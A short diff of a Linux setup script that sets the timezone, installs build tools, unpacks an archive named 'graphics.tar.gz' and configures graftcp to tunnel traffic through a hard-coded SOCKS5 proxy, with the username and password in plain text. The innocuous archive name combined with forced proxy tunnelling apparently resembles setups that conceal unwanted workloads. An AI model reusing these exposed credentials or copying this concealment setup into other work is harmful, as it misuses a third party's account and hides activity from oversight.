@@ -1,4 +1,6 @@
 #!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
 apt update && apt -y install sudo wget curl unzip
 
 sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
@@ -20,8 +22,8 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 =  107.150.105.8:1510
-socks5_username = c991dc493967
+socks5 =  107.150.105.8:1596
+socks5_username = 1a6b56786641
 socks5_password = 8mqvm3wmsevv2mm8ra6d
 END
 
